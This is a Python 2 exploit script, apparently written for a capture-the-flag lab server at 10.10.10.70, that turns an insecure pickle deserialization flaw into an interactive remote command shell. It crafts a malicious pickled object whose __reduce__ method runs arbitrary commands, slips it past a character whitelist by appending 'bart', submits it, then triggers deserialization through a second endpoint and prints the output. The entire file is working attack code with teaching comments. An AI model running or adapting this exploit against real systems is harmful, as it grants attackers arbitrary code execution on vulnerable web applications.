#!/usr/bin/python2
import hashlib
import cPickle as pickle
import subprocess
import shlex
import sys

# Use readline if available.  This gives us the ability to have input history and
# use arrow keys when inputting text.
try:
    import readline
except ImportError:
    pass

import requests

# The object to pickle
class Runner(object):
    # The __reduce__ function determines how an object is pickled.  It is called every time we pickle the object.
    def __reduce__(self):
        # shlex.split allows us to provide commands with arguments (like ls -l)
        # it splits the command into the program (first item) and its arguments (subsequent items)
        # This is how subprocess is expecting the command
        return (subprocess.check_output, (shlex.split(command), ))

def run_command():
    submission_url = 'http://10.10.10.70/submit'
    check_url = 'http://10.10.10.70/check'

    # The character parameter must have a string from the whitelist (WHITELIST variable) in it
    # We choose bart here.  The quote does not matter since it is not checked.
    character_data = pickle.dumps(Runner()) + 'bart'
    quote = 'Eat my shorts'
    
    # The character parameter will be our pickled object.
    submit_request = requests.post(submission_url, data={'character': character_data, 'quote': quote})

    # Make sure the request was processed by the server and that we got a 200 OK back.
    if submit_request.ok:
        # Looking at templates/submit.html, we see that a successful submission prints out the word "Success".  We will
        # look for this in the response we get back from the server.
        print('Successfully submitted command {}'.format(command))
        if "Success" in submit_request.text:
            # Keep going - now we will make a request to /check
            # Upload a hash of the character (the pickled object) and the quote (this is what the form expects)
            expected_id = hashlib.md5((character_data + quote).encode()).hexdigest()
            check_request = requests.post(check_url, data={'id': expected_id})
            if check_request.ok:
                # On success, we get the string Still reviewing: then the data
                if 'Still reviewing: ' in check_request.text:
                    # Get rid of "Still reviewing:" and keep everything else
                    command_output = check_request.text.replace('Still reviewing: ', '')
                    print(command_output)
                else:
                    print('Unexpected output: {}'.format(check_request.text))
            else:
                print('The server returned an error ({}): {}'.format(check_request.status_code, check_request.text))
        else:
            print('There was an error.  {}'.format(submit_request.text))
    else:
        print('There was an error ({}): {}'.format(submit_request.status_code, submit_request.text))

    return

if __name__ == '__main__':
    try:
        command = raw_input('Enter a command to execute (exit to exit): ')
        while (command.lower() != 'exit'):
            if (command.strip() == ''):
                continue
            run_command()
            command = raw_input('Enter a command to execute (exit to exit): ')
    except KeyboardInterrupt:
        print('\n')

